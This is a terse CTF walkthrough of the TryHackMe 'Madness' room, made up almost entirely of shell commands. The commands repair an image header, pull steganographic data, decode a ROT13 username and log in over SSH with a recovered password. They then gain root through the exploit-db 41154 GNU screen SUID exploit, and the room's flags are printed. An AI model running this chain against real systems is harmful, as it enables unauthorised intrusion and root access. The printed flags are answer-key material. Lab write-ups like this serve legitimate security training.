# <div align="center">[Madness](https://tryhackme.com/r/room/madness)</div>
<div align="center">
  <img src="https://github.com/user-attachments/assets/d1a28066-5e54-4f86-ba21-2353d5ecb097" height="200"></img>
</div>

```
nmap -sC -sV <IP>
curl -s http://<IP>
wget http://<IP>/thm.jpg
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
curl -s http://<IP>/th1s_1s_h1dd3n/
curl -s http://<IP>/th1s_1s_h1dd3n/?secret=34
python secret.py
# y2RPJ4QaPF!B 
steghide info thm.jpg
steghide extract -sf thm.jpg
cat hidden.txt
# wbxre
echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# joker
wget https://<IP>/5iW7kC8.jpg
steghide info 5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
sshpass -p "*axA&GF8dP" ssh joker@<IP>
cat user.txt 
```
```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

```
find / -user root -perm -u=s 2>/dev/null
ls -l /bin/screen*
# https://www.exploit-db.com/exploits/41154
sh 41154.sh 
cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```
